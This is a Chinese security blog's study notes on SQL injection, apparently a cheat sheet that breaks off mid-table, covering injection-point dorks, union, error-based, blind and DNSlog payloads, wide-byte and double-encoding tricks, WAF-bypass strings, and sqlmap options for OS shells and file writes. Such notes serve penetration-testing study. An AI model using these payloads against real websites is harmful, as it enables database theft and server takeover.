@@ -1,0 +1,544 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Bbutterf1y's Blog | Bbutterf1y's Blog</title><meta name="author" content="Bbutterf1y,1401198693@qq.com"><meta name="copyright" content="Bbutterf1y"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="笔记参考：http:&#x2F;&#x2F;gv7.me&#x2F;articles&#x2F;2018&#x2F;summarize-all-types-of-sql-injection&#x2F; 基本分类  基础知识 1.web框架结构：将web应用部署在一个容器上与数据库进行交互 web应用分为：web前端、web应用（CMS&#x2F;OA&#x2F;Blog）、web开发框架（Django&#x2F;Struts2&#x2F;ThinkPHP）、web语言（PHP&#x2F;JSP&#x2F;.Net）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bbutterf1y&#39;s Blog">
+<meta property="og:url" content="http://example.com/2020/10/22/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Bbutterf1y&#39;s Blog">
+<meta property="og:description" content="笔记参考：http:&#x2F;&#x2F;gv7.me&#x2F;articles&#x2F;2018&#x2F;summarize-all-types-of-sql-injection&#x2F; 基本分类  基础知识 1.web框架结构：将web应用部署在一个容器上与数据库进行交互 web应用分为：web前端、web应用（CMS&#x2F;OA&#x2F;Blog）、web开发框架（Django&#x2F;Struts2&#x2F;ThinkPHP）、web语言（PHP&#x2F;JSP&#x2F;.Net）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/category.png">
+<meta property="article:published_time" content="2020-10-22T13:43:25.096Z">
+<meta property="article:modified_time" content="2020-10-22T13:43:33.312Z">
+<meta property="article:author" content="Bbutterf1y">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/category.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2020/10/22/SQL%E6%B3%A8%E5%85%A5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="code-5tOvHxcsIh"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: {"text":"人来,人往,勿失,勿忘","fontSize":"15px"},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: false,
+  postUpdate: '2020-10-22 21:43:33'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/category.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Bbutterf1y's Blog</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">无题</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-10-22T13:43:25.096Z" title="发表于 2020-10-22 21:43:25">2020-10-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-10-22T13:43:33.312Z" title="更新于 2020-10-22 21:43:33">2020-10-22</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><p>笔记参考：<a target="_blank" rel="noopener" href="http://gv7.me/articles/2018/summarize-all-types-of-sql-injection/">http://gv7.me/articles/2018/summarize-all-types-of-sql-injection/</a></p>
+<p><strong>基本分类</strong></p>
+<p><img src="https://uploader.shimo.im/f/eC500t74M6oEHM2v.png!thumbnail" alt="图片"></p>
+<p><strong>基础知识</strong></p>
+<p>1.web框架结构：将web应用部署在一个容器上与数据库进行交互</p>
+<p>web应用分为：web前端、web应用（CMS/OA/Blog）、web开发框架（Django/Struts2/ThinkPHP）、web语言（PHP/JSP/.Net）</p>
+<p>容器：IIS、Apache、TomCat、Nginx</p>
+<p>2.SQL语言全称结构化查询语言（StructuredQueryLanguage）：介于关系代数和关系验算之间的语言，是关系数据库语言，功能包括查询、操作、定义和控制四个方面</p>
+<p>3.MySql基础知识：</p>
+<ul>
+<li>常用函数：<ul>
+<li>system_user()：系统用户名</li>
+<li>user()：用户名</li>
+<li>current_user()：当前用户名</li>
+<li>session_user()：连接数据库的用户名</li>
+<li>database()：数据库名（进入数据库后有值）</li>
+<li>version()和@@version：数据库版本（只有MySql对这两种方式都识别）</li>
+<li>@@datadir：数据库路径</li>
+<li>@@basedir：数据库安装路径</li>
+<li>@@version_compile_os：操作系统</li>
+<li>——————————————————————————————</li>
+<li>count()：返回执行结果数量（对某条sql语句执行结果数量的统计）</li>
+<li>concat()：没有分隔符地连接字符串（用,将字符串分隔开不用’’括起）</li>
+<li>concat_ws()：含有分隔符地连接字符串（在括号中指定分隔符,后加字符串）</li>
+<li>group_concat()：连接一个组的所有字符串，并以逗号分隔每一条数据</li>
+<li>load_file()：读取本地文件</li>
+<li>into outfile：写文件（’文件内容’ into outfile ‘文件路径’）</li>
+<li>ascii()：字符串的ASCLL代码值</li>
+<li>ord()：返回字符串第一个字符的ASCLL值</li>
+<li>mid()：返回一个字符串的一部分（’字符串’,起始位置,结束位置）（以1开始）</li>
+<li>substr()：功能同上</li>
+<li>length：返回字符串的长度</li>
+<li>left()：返回字符串最左面x字符（’string’,x）</li>
+<li>floor()：返回小于或等于x的最大整数</li>
+<li>rand()：返回0-1之间的一个随机数</li>
+<li>extractvalue()：从目标XML返回包含所查询值的字符串（第一个参数是XML的字符，第二个参数是Xpath格式的字符串）</li>
+<li>updatexml()：改变文档中符合条件的节点的值（在上一个函数的基础上加第三个参数，第三个函数为替换查找到值的字符串）</li>
+<li>sleep()：让此语句运行N秒钟</li>
+<li>if()：判断条件，条件为真返回第一个值，未假返回第二个值</li>
+<li>char()：返回整数ASCLL代码字符组成的字符串</li>
+<li>strcmp()：比较字符串大小（前面小返回-1，相等返回0，前面大返回1）</li>
+<li>ifnull()：第一个参数不为NULL则返回第一个参数，否则返回第二个参数</li>
+<li>exp()：返回e的x次方（exp(x)）</li>
+</ul>
+</li>
+<li>运算符：<ul>
+<li>div：除法运算，同/</li>
+<li>mod：求余运算，同%</li>
+<li>is null：为空</li>
+<li>is not null：不为空</li>
+<li>between and：在…之间</li>
+<li>in：包含（in(值)）</li>
+<li>not in：不包含</li>
+<li>like：模式匹配（like ‘值’ 在值的两侧加%搜索包含值的所有值）</li>
+<li>not like：模式匹配</li>
+<li>regexp：正则表达式</li>
+<li>&amp;&amp;或and：与</li>
+<li>||或or：或</li>
+<li>|或not：非</li>
+<li>xor：异或</li>
+</ul>
+</li>
+</ul>
+<p>4.sql注入概念：将一段sql语句插入到可以被数据库直接执行的位置，根据返回结果，获得一些数据库信息</p>
+<p>5.注入流程：数据库→数据表→列→数据</p>
+<p>寻找注入点</p>
+<ul>
+<li>目标搜集：<ul>
+<li>无特定目标：inurl:.php?id=</li>
+<li>有特定目标：inurl:.php?id= site:target.com</li>
+<li>工具爬取：spider，对搜索引擎和目标 网站链接爬取</li>
+</ul>
+</li>
+<li>注入识别：<ul>
+<li>手工简单识别：<ul>
+<li>‘</li>
+<li>and 1=1/and 1=2</li>
+<li>and’1’=’1/and ‘1’=’2（将原本语句引号闭合）</li>
+<li>and 1 like 1/and 1 like 2（过滤等于号）</li>
+</ul>
+</li>
+<li>工具识别<ul>
+<li>sqlmap -m filename（filename中保存检测目标）（无特定目标）</li>
+<li>sqlmap –crawl（sqlmap对目标网站爬取，依次测试）（有特定目标）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>高级识别：<ul>
+<li>扩展识别广度和深度<ul>
+<li>sqlmap –level 增加测试级别（1-5级），对header中相关参数也进行测试</li>
+<li>sqlmap -r filename（filename中为网站请求的数据）</li>
+</ul>
+</li>
+<li>利用工具提高识别效率<ul>
+<li>BurpSuite+SqlMap（Burp中有sqlmap插件SQLiPy Sqlmap Integration）</li>
+</ul>
+</li>
+<li>Tips<ul>
+<li>参数后加*来确定想要测试的参数</li>
+<li>可能出现注入的点：新闻、登陆、搜索（搜索的作者、时间范围、关键字）、留言</li>
+<li>开发者角度</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>代码审计：<ul>
+<li>搜索关键代码和函数：sql语句select关键字用户输入方式GET POST</li>
+<li>梳理业务流程</li>
+</ul>
+</li>
+</ul>
+<p>注入流程</p>
+<ul>
+<li>信息搜集<ul>
+<li>数据库类型<ul>
+<li>报错信息</li>
+<li>特有语句</li>
+</ul>
+</li>
+<li>数据库版本：函数：@@version（SQL Server）version()（MySQL）v$version（Oracle）</li>
+<li>数据库用户：user()（MySQL）SYSTEM_USER（SQL Server）</li>
+<li>数据库权限：super_priv（MySQL）IS_SRVROLEMEMBER（SQL Server）</li>
+</ul>
+</li>
+<li>数据获取（语句查询、暴力破解）<ul>
+<li>获取库信息</li>
+<li>获取表信息</li>
+<li>获取列信息</li>
+<li>获取数据</li>
+</ul>
+</li>
+<li>提权（根据数据库权限）<ul>
+<li>执行系统命令——直接提权（SQLServer sa权限xp.cmdshell）<ul>
+<li>sqlmap –os-shell：执行系统命令</li>
+</ul>
+</li>
+<li>读文件<ul>
+<li>读数据库配置文件，尝试远程连接</li>
+<li>读系统中间件配置文件，搜集信息</li>
+</ul>
+</li>
+<li>写文件——写webshell到网站目录</li>
+</ul>
+</li>
+</ul>
+<p>6.手工注入方法</p>
+<p>MySQL数据库结构（从上层至底层）</p>
+<ul>
+<li>连接层<ul>
+<li>通信协议：与外部应用程序的通信方式</li>
+<li>线程：连接数量的管理</li>
+<li>验证：验证用户输入的用户名与密码</li>
+</ul>
+</li>
+<li>Sql层：数据库任务的执行，并将结果处理返回<ul>
+<li>解析器、授权、优化器、查询执行、查询高速缓存、查询日志记录</li>
+<li>判断语法、语句、语义</li>
+<li>数据库对象授权情况判断，授权失败不继续</li>
+<li>解析（解析器）：将sql语句解析成执行计划，运行执行计划，生成找数据的方式</li>
+<li>优化（优化器）：运行执行计划，基于算法，从执行计划中选择代价最小的交给“执行器”</li>
+<li>执行（执行器）：运行执行计划，最终生产如何去磁盘找数据方式</li>
+<li>将取数据的方式，交由下层（存储引擎层）进行处理</li>
+<li>最终将取出的数据抽象成管理员或用户能看懂的方式（表），展现在用户面前</li>
+<li>查询缓存：缓存之前查询的数据</li>
+</ul>
+</li>
+<li>存储引擎层：数据的存取，定义数据存储的格式和方式（磁盘、内存、网络）</li>
+</ul>
+<p>Mysql内置库（&gt;=5.7）：</p>
+<ul>
+<li>mysql：保存有账户信息，权限信息，存储过程，event，时区等信息</li>
+<li>sys：包含了一系列的存储过程、自定义函数以及视图来帮助我们快速的了解系统的元数据信息。（元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）</li>
+<li>performance_schema：用于收集数据库服务器性能参数</li>
+<li>information_schema：它提供了访问数据库元数据的方式。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表的数据类型与访问权限等。</li>
+</ul>
+<p>MySQL手工注入方法</p>
+<p>核心原理：通过information_schema库查看到数据库中所有的数据信息</p>
+<p>查询数据核心语法：</p>
+<p>|功能名称|查询语句|<br>|:—-:|:—-|:—-|<br>|查库|select schema_name from information_schema.schemata|<br>|查表|select table_name from information_schema.tables where table_schema=’库名’ （将库名转换为16进制可以省略单引号）|<br>|查列|select column_name from information_schema.columns where table_schema=’表名’ （同上）|<br>|查数据|select 列名 from 库名.表名|</p>
+<p>tips1：所有类型的sql注入都是基于查库、表、列语句</p>
+<p>tips2：如果数据太多将会导致无法返回查询结果</p>
+<p>查询场景：利用limit限定返回的数量及位置，依次查询（limit x,y （第x条数据开始返回y条））</p>
+<p>回显数据的场景：<em>concat</em>连接多个数据成为一条返回结果</p>
+<p><strong>进阶知识</strong></p>
+<p>1.union查询注入</p>
+<p>union介绍：UNION 操作符用于合并两个或多个SELECT语句的结果集</p>
+<p>注：UNION内部的SELECT语句必须拥有相同数量的列，列也必须拥有相似的数据类型，每条SELECT中的列的顺序必须是相同的</p>
+<p>UNION操作符选取的是不同的值，如果允许重复的值，使用UNION ALL</p>
+<p>union查询注入方法</p>
+<p>前提：注入点页面有回显</p>
+<p>只要union连接的几个查询的字段数一样且列的数据类型转换没有问题，就可以查询出结果</p>
+<p>注意：order bylimit insert update 等后面不能再加select子句</p>
+<p>过程：</p>
+<ol>
+<li>order by 确定列数（order by 才出来的列数超过数据库表中的列数，将会报错不返回数据，不断试错猜出，猜出后union才能并列数不报错）</li>
+<li>观察页面返回，选取可以显示数据的位置，进行下一步的注入</li>
+<li>执行任意语句（读库，读表，读字段，读数据等）</li>
+</ol>
+<p>2.报错注入</p>
+<p>报错注入原理：</p>
+<p>构造 payload 让信息通过错误提示回显出来</p>
+<p>应用场景：查询不回显内容，但是会打印错误信息。update、insert等语句会打印错误信息等</p>
+<p>报错注入方法：</p>
+<p>floor()</p>
+<ul>
+<li>group by对rand()函数进行操作时产生错误</li>
+<li>语句：select count(*) from information_schema.tables group by concat ((select version()),floor(rand(0)*2))</li>
+</ul>
+<p>extractvalue()</p>
+<ul>
+<li>第二个参数xpath语法错误产生报错</li>
+<li>语句：extractvalue(1,concat(0x7e,(select user()),0x7e))</li>
+</ul>
+<p>updatexml()</p>
+<ul>
+<li>第二个参数xpath语法错误产生报错</li>
+<li>语句：select updatexml(1,concat(0x7e,(select user()),0x7e),1)</li>
+</ul>
+<p>注：报错内容超过32位将显示不完整使用substr()对数据进行截取</p>
+<p>3.SQL盲注</p>
+<p>布尔盲注</p>
+<ol>
+<li>布尔盲注原理</li>
+<li>页面不显示回显数据和回显错误信息只返回两种情况（right or wrong），通过构造语句，判断数据库中的内容布尔盲注方法<ol>
+<li>left()函数<ol>
+<li>left(database(),1)&gt;’s’</li>
+<li>database()显示数据库名称，left(a,b)从左侧截取a的前b位</li>
+</ol>
+</li>
+<li>regexp<ol>
+<li>select user() regexp ‘^r’</li>
+<li>正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式</li>
+</ol>
+</li>
+<li>like<ol>
+<li>select user() like ‘ro%’</li>
+<li>与regexp类似，使用like进行匹配</li>
+</ol>
+</li>
+<li>substr()函数 ascii()函数<ol>
+<li>ascii(substr((select database()),1,1))=98</li>
+<li>substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将某个字符转换为ascii值</li>
+</ol>
+</li>
+<li>ord()函数 mid()函数<ol>
+<li>ord(mid((select user()),1,1))=114</li>
+<li>mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii()，ord()将字符转为ascii值</li>
+</ol>
+</li>
+<li>注：使用ascii是为了防止’’被转义</li>
+</ol>
+</li>
+</ol>
+<p>时间盲注</p>
+<ol>
+<li>时间盲注原理：通过页面回显数据无法判断，构造语句，让程序延时执行，判断信息</li>
+<li>时间盲注方法：if(left(user(),1)=’a’,0,sleep(3))</li>
+</ol>
+<p>Dnslog盲注</p>
+<ol>
+<li>Dnslog盲注原理：·减少盲注次数，使用Dnslog实现注入</li>
+<li>Mysql LOAD_FILE函数可以发起请求：SELECT LOAD_FILE(CONCAT(‘\\‘,’test’,’.mysql.xxxx\abc’)) —— test.mysql.xxxxDnslog盲注方法： 利用load_file()函数发起请求，使用Dnslog接受请求，获取数据</li>
+</ol>
+<p>语法：select load_file(concat(‘\\‘,(select database()),’.mysql.xxxx\abc’)) （只有win系统可以，数据格式和内容有限制不能有：~@等）4.宽字节注入</p>
+<p>宽字节注入原理：</p>
+<p>宽字节：GB2312、GBK、GB18030、BIG5、Shift_JIS等，实际为两个字节</p>
+<p>将两个字符作为一个字符消除转义字符</p>
+<p>宽字节注入方法：GBK码在注入点后键入%df，然后正常注入（Ascii码大于128才到汉字范围）</p>
+<p>黑盒测试：在可能的注入点后面加%df，进行测试</p>
+<p>白盒测试：</p>
+<ul>
+<li>查看Mysql编码</li>
+<li>是否使用了preg_replace</li>
+<li>是否使用了addslashes</li>
+<li>是否使用了mysql_real_escape_string</li>
+</ul>
+<p>宽字节防御：</p>
+<ul>
+<li>使用utf-8，避免宽字节注入</li>
+<li>mysql_real_escape_string，mysql_set_charset(‘gbk’,$conn)</li>
+<li>可以设置参数，character_set_client=binary</li>
+</ul>
+<p>5.二次编码注入</p>
+<p>二次编码注入原理：urldecode()与PHP本身处理编码时配合失误</p>
+<p>二次编码注入方法：在注入点后键入%2527，然后正常注入</p>
+<p>黑盒测试：在可能的注入点后键入%2527，进行测试</p>
+<p>白盒测试：是否使用了urldecode函数并且在转义方法之后</p>
+<p>6.二次注入</p>
+<p>二次注入原理：</p>
+<ol>
+<li>插入恶意数据</li>
+<li>将数据插入数据库时，数据库仅对特殊字符转义，写入数据库时还原保存了原来数据，但数据是恶意内容引用恶意数据</li>
+</ol>
+<p>在恶意数据插入数据库后，在另一处进行操作将数据读出时，没有进行验证，执行了恶意数据，造成二次注入    二次注入方法：</p>
+<p>二次注入防御：对外部提交数据做检查，对内部数据调用也做检查</p>
+<p>7.WAF绕过原理</p>
+<p>白盒绕过</p>
+<ol>
+<li>分析代码</li>
+<li>绕过限制：大小写 等价替换 双写等等</li>
+</ol>
+<p>黑盒绕过</p>
+<ul>
+<li>架构层绕过WAF：<ul>
+<li>寻找源站 —— 针对云WAF</li>
+<li>利用同网段主机或边界漏洞 —— 绕过WAF</li>
+</ul>
+</li>
+<li>资源限制角度绕过WAF：POST大body</li>
+<li>协议层面绕过WAF的检测：<ul>
+<li>协议未覆盖绕过WAF<ul>
+<li>请求方式变换</li>
+<li>Content-Type变换</li>
+</ul>
+</li>
+<li>参数污染</li>
+</ul>
+</li>
+<li>规则层面绕过<ul>
+<li>SQL注释符绕过<ul>
+<li>union/**/select</li>
+<li>union/<em>aaaa%01bbs</em>/select</li>
+<li>union/<em>aaaaaaaaaaaaaaaa</em>/select</li>
+<li>内连注释：/<em>!xxx</em>/</li>
+</ul>
+</li>
+<li>空白符绕过<ul>
+<li>Mysql空白符：%09  %0A  %0B  %0D  %20  %0C  %A0  /<em>xxx</em>/</li>
+<li>正则空白符：%09  %0A  %0B  %0D  %20</li>
+</ul>
+</li>
+<li>函数分隔符号<ul>
+<li>concat%2520()</li>
+<li>concat/**/</li>
+<li>concat%25c0()</li>
+<li>concat%25a0()</li>
+</ul>
+</li>
+<li>浮点数词法解析<ul>
+<li>select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0</li>
+<li>select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0</li>
+<li>select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0</li>
+</ul>
+</li>
+<li>利用error-based进行SQL注入<ul>
+<li>extractvalue(1,concat(0x5c,md5(3)))</li>
+<li>updatexml(1,concat(0x5d,md(3)),1)</li>
+<li>GeometryCollection((select<em>from(select</em>from(select@@version)f)x))</li>
+<li>polygon((select*from(select name_const(version(),1))x))</li>
+<li>linestring()</li>
+<li>multipoint()</li>
+<li>multilinestring()</li>
+<li>multipolygon()</li>
+</ul>
+</li>
+<li>MySQL特殊语法：select{x table_name}from{x information_schema.tables};</li>
+</ul>
+</li>
+</ul>
+<p>Fuzz绕过WAF</p>
+<p>8.Sqlmap脚本编写</p>
+<p>SqlMap介绍</p>
+<ul>
+<li>-u url 自动对id uid等注入点进行测试<ul>
+<li>加 -p 参数选择测试点 eg：-p id</li>
+<li>加 * 号sqlmap在*位置加载payload</li>
+</ul>
+</li>
+<li>–current-db 获取当前的库信息  –current-user 获取当前的用户信息</li>
+<li>–dbs 所有数据库名称<ul>
+<li>-D 数据库名 –tables 获取表</li>
+<li>-D 数据库名 -T 表名 –columns 获取列</li>
+<li>-D 数据库名 -T 表名 -C 列名（可以指定多列） –dump 获取值</li>
+</ul>
+</li>
+<li>高级命令<ul>
+<li>–os-shell 执行系统命令</li>
+<li>–sql-shell 执行sql语句</li>
+<li>–file-read 读文件</li>
+<li>–file-write 本地文件 –file-dest 目标目录 写文件</li>
+</ul>
+</li>
+</ul>
+<p>SqlMap Tamper脚本介绍</p>
+<p>调用：– tamper=</p>
+<p>脚本都位于sqlmap目录下tamper文件夹中</p>
+<p>|支持的数据库|编号|脚本名称|作用|实现方式|<br>|:—-:|:—-|:—-:|:—-|:—-:|:—-|:—-|:—-|:—-|<br>|    <br><br><br><br><br>all|1|apostrophemask.py|用utf8代替引号|1 AND ‘1’=’1<br>1 AND %EF%BC%871%EF%BC%87=%EF%BC%871|<br>|    |2|base64encode.py|用base64编码替换|1’ AND SLEEP(5)#<br>MScgQU5EIFNMRUVQKDUpIw==|<br>|    |3|multiplespaces.py|围绕SQL关键字添加多个空格|1 UNION SELECT foobar<br>1    UNION     SELECT   foobar|<br>|    |4|space2plus.py|用+替换空格|SELECT id FROM users<br>SELECT+id+FROM+users|<br>|    |5|nonrecursivereplacement.py|双重查询语句|1 UNION SELECT 2–<br>1 UNIOUNIONN SELESELECTCT 2–|<br>|    |6|space2randomblank.py|空白字符可选字符的有效集中随机选择一个代替空白字符|SELECT id FROM users<br>SELECT%0Did%0DFROM%0Ausers|<br>|    |7|unionalltounion.py|UNION ALL SELECT UNION SELECT替换|-1 UNION ALL SELECT<br>-1 UNION SELECT|<br>|    |8|securesphere.py|追加特制的字符串|1 AND 1=1<br>1 AND 1=1 and ‘0having’=’0having’|<br>|    <br><br><br><br><br><br><br><br><br>mssql|1|space2hash.py|绕过过滤。’=’ 替换空格字符，（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行|’1 AND 9227=9227’<br>‘1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227’|<br>|    |2|equaltolike.py|like 代替等号|SELECT * FROM users WHERE id=1<br>SELECT * FROM users WHERE id LIKE 1|<br>|    |3|space2mssqlblank.py|空格替换为其它空符号|SELECT id FROM users<br>SELECT%08id%02FROM%0Fusers|<br>|    |4|space2mssqlhash.py|替换空格|1 AND 9227=9227<br>1%23%0AAND%23%0A9227=9227|<br>|    |5|between.py|用between替换大于号|1 AND A &gt; B–<br>1 AND A NOT BETWEEN 0 AND B–|<br>|    |6|percentage.py|asp允许每个字符前面添加一个%号|SELECT FIELD FROM TABLE<br>%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E|<br>|    |7|sp_password.py|追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾|1 AND 9227=9227–<br>1 AND 9227=9227– sp_password|<br>|    |8|charencode.py|url编码|SELECT FIELD FROM%20TABLE<br>%53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45|<br>|    |9|randomcase.py|随机大小写|INSERT<br>InsERt|<br>|    |10|charunicodeencode.py|字符串 unicode 编码|SELECT FIELD%20FROM TABLE<br>%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045|<br>|    |11|space2comment.py|用’/<strong>/’代替空格|SELECT id FROM users<br>SELECT/</strong>/id/<strong>/FROM/</strong>/users|<br>|MySQL&gt;=5.1.13|1|equaltolike.py|like 代替等号|SELECT * FROM users WHERE id=1<br>SELECT * FROM users WHERE id LIKE 1|<br>|    |2|greatest.py|绕过过滤大于号 ,用GREATEST替换大于号。|1 AND A &gt; B<br>1 AND GREATEST(A,B+1)=A|<br>|    |3|apostrophenullencode.py|绕过过滤双引号，替换字符和双引号。|1 AND 